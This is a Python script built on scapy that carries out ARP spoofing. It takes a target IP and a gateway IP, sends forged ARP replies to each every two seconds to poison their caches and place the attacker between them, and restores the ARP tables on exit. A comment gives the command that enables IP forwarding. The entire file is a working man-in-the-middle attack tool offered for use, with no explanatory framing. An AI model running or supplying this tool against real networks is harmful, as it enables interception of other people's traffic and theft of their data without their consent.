#!/usr/bin/env python3

import re
import time
import scapy.all as scapy
import optparse
# echo 1 > /proc/sys/net/ipv4/ip_forward


def load_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP to spoof")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Gateway IP to spoof")
    (opt, args) = parser.parse_args()

    if opt.target_ip is None:
        parser.error("[-] Target IP is missing. \nUse -h or --help to see options.")
    elif opt.gateway_ip is None:
        parser.error("[-] Gateway IP is missing. \nUse -h or --help to see options.")

    return opt


def get_mac(ip):
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp = scapy.ARP(pdst=ip)
    full_arp_request = broadcast/arp

    ans = scapy.srp(full_arp_request, timeout=2, verbose=False)[0]

    if len(ans) > 0:
        return ans[0][1].hwsrc
    else:
        return -1


def spoof(ip, spoof_ip):
    # Getting target MAC & checking its format
    mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(get_mac(ip)))

    if mac:
        # Building ARP response packet
        packet = scapy.ARP(op=2, pdst=ip, hwdst=mac.group(0), psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    else:
        print("[-] Error. MAC Value is incorrect for {0}".format(ip))
        exit(-1)


def restore_defaults(dst_ip, src_ip):
    dst_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(get_mac(dst_ip)))
    src_mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(get_mac(src_ip)))

    if dst_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac.group(0), psrc=src_ip, hwsrc=src_mac.group(0))
        scapy.send(packet, count=4, verbose=False)
    else:
        print("[-] Error. MAC Value is incorrect.")
        exit(-1)


if __name__ == "__main__":
    params = load_args()
    print("[+] Currently spoofing target IP {0}".format(params.target_ip))
    sent_packets = 0

    try:
        while True:
            spoof(params.target_ip, params.gateway_ip)
            spoof(params.gateway_ip, params.target_ip)
            sent_packets += 2
            print("\r[+] Packets sent: {0}".format(sent_packets), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Restoring ARP Tables...")
        restore_defaults(params.target_ip, params.gateway_ip)
        restore_defaults(params.gateway_ip, params.target_ip)
        print("[-] Killing process")
